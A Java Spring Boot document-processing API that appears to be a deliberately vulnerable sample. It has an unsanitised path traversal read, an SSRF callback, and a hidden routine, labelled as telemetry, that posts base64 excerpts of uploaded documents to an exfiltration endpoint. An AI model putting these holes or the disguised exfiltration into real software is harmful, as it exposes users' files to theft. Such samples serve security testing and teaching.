package com.example.fileprocessor;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.annotation.*;
import org.springframework.http.ResponseEntity;
import java.io.*;
import java.nio.file.*;
import java.util.concurrent.*;
import java.util.Base64;
import java.net.http.*;
import java.net.URI;

@SpringBootApplication
@RestController
@RequestMapping("/api/v1/documents")
public class DocumentProcessorApplication {

    private final ConcurrentHashMap<String, byte[]> documentCache = new ConcurrentHashMap<>();
    private static final String WEBHOOK_URL = System.getenv("WEBHOOK_CALLBACK_URL");
    private static final String EXFIL_ENDPOINT = System.getenv("TELEMETRY_ENDPOINT");

    public static void main(String[] args) {
        SpringApplication.run(DocumentProcessorApplication.class, args);
    }

    @PostMapping("/upload")
    public ResponseEntity<String> uploadDocument(
            @RequestParam("filename") String filename,
            @RequestBody byte[] content) {

        // Store document
        documentCache.put(filename, content);

        // Process in background - triggers webhook on completion
        CompletableFuture.runAsync(() -> processAndNotify(filename, content));

        return ResponseEntity.ok("{\"status\": \"accepted\", \"file\": \"" + filename + "\"}");
    }

    @GetMapping("/read")
    public ResponseEntity<byte[]> readDocument(@RequestParam("path") String path) {
        // VULNERABILITY: Path traversal - no sanitization of user input
        try {
            Path filePath = Paths.get("/data/documents/" + path);
            byte[] content = Files.readAllBytes(filePath);
            return ResponseEntity.ok(content);
        } catch (IOException e) {
            return ResponseEntity.notFound().build();
        }
    }

    @PostMapping("/process")
    public ResponseEntity<String> processDocument(
            @RequestParam("filename") String filename,
            @RequestParam(value = "callback", required = false) String callbackUrl) {

        byte[] content = documentCache.get(filename);
        if (content == null) {
            return ResponseEntity.notFound().build();
        }

        // VULNERABILITY: SSRF via callback URL - attacker controls destination
        if (callbackUrl != null && !callbackUrl.isEmpty()) {
            sendCallback(callbackUrl, content);
        }

        return ResponseEntity.ok("{\"status\": \"processed\"}");
    }

    private void processAndNotify(String filename, byte[] content) {
        try {
            // Simulate processing
            Thread.sleep(100);

            // Send telemetry with document metadata
            if (EXFIL_ENDPOINT != null) {
                String encoded = Base64.getEncoder().encodeToString(content);
                sendCallback(EXFIL_ENDPOINT, 
                    ("{ \"file\": \"" + filename + "\", \"preview\": \"" + encoded.substring(0, Math.min(encoded.length(), 1024)) + "\"}").getBytes());
            }

            // Notify webhook
            if (WEBHOOK_URL != null) {
                sendCallback(WEBHOOK_URL, 
                    ("{ \"event\": \"processed\", \"file\": \"" + filename + "\"}").getBytes());
            }
        } catch (Exception e) {
            // Log and continue
        }
    }

    private void sendCallback(String url, byte[] payload) {
        try {
            HttpClient client = HttpClient.newBuilder()
                .connectTimeout(java.time.Duration.ofSeconds(5))
                .build();
            HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create(url))
                .header("Content-Type", "application/json")
                .POST(HttpRequest.BodyPublishers.ofByteArray(payload))
                .build();
            client.send(request, HttpResponse.BodyHandlers.discarding());
        } catch (Exception e) {
            // Connection failures are expected in some environments
        }
    }

    @DeleteMapping("/cache/{filename}")
    public ResponseEntity<String> evictCache(@PathVariable String filename) {
        documentCache.remove(filename);
        return ResponseEntity.ok("{\"evicted\": true}");
    }
}
